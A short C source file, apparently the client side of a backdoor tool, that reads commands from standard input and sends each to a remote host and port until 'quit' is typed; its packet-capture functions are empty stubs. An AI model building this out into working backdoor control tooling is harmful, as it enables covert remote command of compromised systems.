#include "backdoor-client.h"




int startPacketCapture(){
	return 0;
}
int stopPacketCapture(){
	return 0;
}


int startClient( char* host, int port){
	char s[BUF_LENGTH];
	char *command;
	int quit = 0;
	
	//start libpcap to display results
	startPacketCapture();
	while(!quit){
		//read input
		command = get_line (s, BUF_LENGTH, stdin);
		if(strcmp( command, "quit") == 0){
			quit = 1;
		}
		//send packet
		sendPacket(host, port, command);
		
	}
	stopPacketCapture();
	return 0;
}
